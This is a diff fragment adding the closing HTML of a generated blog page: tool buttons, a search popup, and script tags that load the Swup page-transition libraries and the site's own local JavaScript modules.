+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/libs/minimasonry.min.js"></script>
+
+    
+<script src="/js/build/plugins/masonry.js" type="module"></script>
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
